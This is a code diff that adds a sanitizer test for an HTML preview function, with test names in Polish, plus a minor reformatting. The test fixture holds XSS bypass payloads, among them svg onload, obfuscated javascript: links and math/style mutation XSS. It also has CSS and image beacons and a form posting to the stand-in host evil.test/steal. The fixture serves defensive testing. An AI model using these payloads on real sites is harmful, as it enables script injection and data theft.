@@ -714,6 +714,37 @@ test.group('Billing', (group) => {
     assert.include(clean, 'fonts.googleapis.com')
   })
 
+  test('sanitizePreviewHtml (SEC-11): wektory obejścia regexów i meta CSP', ({ assert }) => {
+    const dirty = `<!doctype html><html><head><title>T</title>
+      <link rel="stylesheet" href="https://fonts.googleapis.com.evil.test/css">
+      <link rel="stylesheet" href="//evil.test/?fonts.googleapis.com">
+      <link rel="preload" href="https://fonts.googleapis.com/css2?family=Inter">
+      <style>@import url("https://evil.test/a.css"); @import "https://fonts.googleapis.com/css2?family=Inter";
+      body{background:url(https://evil.test/track.png);color:#111} .x{background:url("data:image/png;base64,AAAA")}</style>
+      </head><body>
+      <svg/onload=alert(1)><circle cx="5" cy="5" r="4" fill="#f00"/></svg>
+      <a href=javascript:alert(1)>a</a>
+      <a href="&#106;avascript:alert(1)">b</a>
+      <a href="JaVaScRiPt&colon;alert(1)">c</a>
+      <img src="https://evil.test/p.png" alt="x"><img src="data:image/png;base64,AAAA" alt="ok">
+      <div style="background-image:url(https://evil.test/s.png);padding:8px">d</div>
+      <form action="https://evil.test/steal"><input name="q" onfocus="x()"><button formaction="https://evil.test">s</button></form>
+      <math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>
+      </body></html>`
+    const clean = sanitizePreviewHtml(dirty)
+    assert.notInclude(clean, 'evil.test')
+    assert.notMatch(clean, /javascript/i)
+    assert.notMatch(clean, /\sonload|\sonerror|\sonfocus/i)
+    assert.notInclude(clean, 'action=')
+    assert.include(clean, '<circle')
+    assert.include(clean, 'data:image/png;base64,AAAA')
+    assert.include(clean, '@import "https://fonts.googleapis.com/css2?family=Inter"')
+    assert.include(clean, 'padding:8px')
+    assert.match(clean, /^<!doctype html>/)
+    assert.include(clean, `<meta http-equiv="Content-Security-Policy" content="default-src 'none'`)
+    assert.notInclude(clean, 'rel="preload"')
+  })
+
   test('API v1 i MCP: token Bearer, płatny plan, DESIGN.md i tokeny', async ({
     client,
     assert,
@@ -836,7 +867,12 @@ test.group('Billing', (group) => {
     const owner = await makeUser('owner')
     const board = await createBoard(owner, 'Wspólna')
     for (let v = 1; v <= 3; v++) {
-      await DesignDoc.create({ boardId: board.id, version: v, status: 'ready', contentMd: `# v${v}` })
+      await DesignDoc.create({
+        boardId: board.id,
+        version: v,
+        status: 'ready',
+        contentMd: `# v${v}`,
+      })
     }
     const member = await makeUser('member')
     await BoardMember.create({
